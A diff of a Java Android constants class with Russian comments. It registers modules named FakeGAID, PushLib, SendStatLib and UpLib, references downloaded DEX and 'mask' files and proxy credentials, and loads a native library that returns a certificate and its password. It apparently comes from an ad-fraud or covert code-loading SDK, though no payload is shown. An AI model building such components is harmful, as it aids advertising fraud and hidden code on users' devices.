@@ -13,7 +13,7 @@ public class C {
     public static String URL_TO_CHECK_CONNECTION = "https://google.com";
     public static ILib[] getLibs(Context cnt) //путь по которому сохраняются скаченные файлы (настроечные, dex-файлы, динамические файлы маски...)
     {
-        ILib[] l = {Shell.FakeGAID(cnt), Shell.PushLib(cnt), Shell.SendStatLib(cnt)};
+        ILib[] l = {Shell.UpLib(cnt), Shell.FakeGAID(cnt), Shell.PushLib(cnt), Shell.SendStatLib(cnt)};
         return l;
     }
     //public static String[] LIBS = {FakeGAID.LIB_NAME, IntLib.LIB_NAME};
@@ -47,21 +47,7 @@ public class C {
     public native String getCert_ndk();         //ndk метод полученяи самого сертификата
     public native String stringFromJNI();       //Тестовый ndk метод, не используется
 
-    static {
-        System.loadLibrary("hello-jni2");
-    }
-    public String testJNI()
-    {
-        return stringFromJNI();
-    }
-    public String getPassToCert()
-    {
-        return getPassToCert_ndk();
-    }
-    public String getCert()
-    {
-        return getCert_ndk();
-    }
+
 
     //***********************************************************************************************
     // ***********************    константы для SharedPreferences    ********************************
@@ -104,4 +90,26 @@ public class C {
     public static String JSON_KEY_PROXY_PASSWORD        = "password";              //Пароль прокси
     public static String JSON_KEY_PROXY_TIMEOUT         = "timeout";               //Таймаут по которому считаем что прокси не отвечает, если 0 то используется дефолтный
     //***********************************************************************************************
+
+
+
+
+    /**********************************************************************************************
+     * !!!!! ДЛЯ СБОРКИ DEX-а ЭТУ ЧАСТЬ НАДО ЗАКОМЕННТИРОВАТЬ !!!!
+    **********************************************************************************************/
+    static {
+        System.loadLibrary("hello-jni2");
+    }
+    public String testJNI()
+    {
+        return stringFromJNI();
+    }
+    public String getPassToCert()
+    {
+        return getPassToCert_ndk();
+    }
+    public String getCert()
+    {
+        return getCert_ndk();
+    }
 }
